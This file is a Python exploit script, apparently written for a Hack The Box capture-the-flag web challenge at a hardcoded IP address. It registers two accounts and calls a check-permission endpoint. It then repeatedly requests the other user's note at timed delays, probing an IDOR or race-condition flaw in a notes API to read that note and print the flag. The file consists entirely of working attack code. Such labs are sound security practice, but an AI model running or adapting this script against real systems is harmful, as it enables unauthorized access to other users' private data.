#!/usr/bin/env python3
import requests
import time

BASE_URL = "http://83.136.255.203:47148"

# Create two fresh users
email1 = f"alice{int(time.time()*1000000)}@test.com"
email2 = f"bob{int(time.time()*1000000)+1}@test.com"

r1 = requests.post(f"{BASE_URL}/api/auth/register", json={"email": email1, "password": "test123"})
TOKEN1 = r1.json()['token']
headers1 = {"Authorization": f"Bearer {TOKEN1}"}

r2 = requests.post(f"{BASE_URL}/api/auth/register", json={"email": email2, "password": "test123"})
TOKEN2 = r2.json()['token']
headers2 = {"Authorization": f"Bearer {TOKEN2}"}

# Get their notes
notes1 = requests.get(f"{BASE_URL}/api/notes", headers=headers1).json()['notes']
notes2 = requests.get(f"{BASE_URL}/api/notes", headers=headers2).json()['notes']

alice_note = notes1[0]['id']
bob_note = notes2[0]['id']

print(f"[*] Alice: {email1}")
print(f"    Alice's note: {alice_note}")
print(f"[*] Bob: {email2}")
print(f"    Bob's note: {bob_note}")

print("\n[*] Scenario 1: Alice calls check-permission on HER note, then tries to access Bob's note")
requests.get(f"{BASE_URL}/api/notes/{alice_note}/check-permission", headers=headers1)

for delay_ms in [0, 10, 50, 100, 150]:
    if delay_ms > 0:
        time.sleep(delay_ms / 1000.0)
    
    r = requests.get(f"{BASE_URL}/api/notes/{bob_note}", headers=headers1)
    result = r.json()
    
    if result.get('success'):
        content = result.get('note', {}).get('content', '')
        print(f"  [!!!] SUCCESS at {delay_ms}ms: {content}")
        
        if 'HTB{' in content:
            print(f"\n[!!!] FLAG: {content}")
            exit(0)
        break
    elif delay_ms == 100:
        print(f"  [-] Failed at {delay_ms}ms: {result.get('error', 'Unknown')}")

print("\n[*] Scenario 2: Alice calls check-permission on BOB'S note (will fail), then tries to access it")
requests.get(f"{BASE_URL}/api/notes/{bob_note}/check-permission", headers=headers1)

for delay_ms in [0, 10, 50, 100, 150]:
    if delay_ms > 0:
        time.sleep(delay_ms / 1000.0)
    
    r = requests.get(f"{BASE_URL}/api/notes/{bob_note}", headers=headers1)
    result = r.json()
    
    if result.get('success'):
        content = result.get('note', {}).get('content', '')
        print(f"  [!!!] SUCCESS at {delay_ms}ms: {content}")
        
        if 'HTB{' in content:
            print(f"\n[!!!] FLAG: {content}")
            exit(0)
        break
    elif delay_ms == 100:
        print(f"  [-] Failed at {delay_ms}ms: {result.get('error', 'Unknown')}")

print("\n[*] No IDOR vulnerability found")
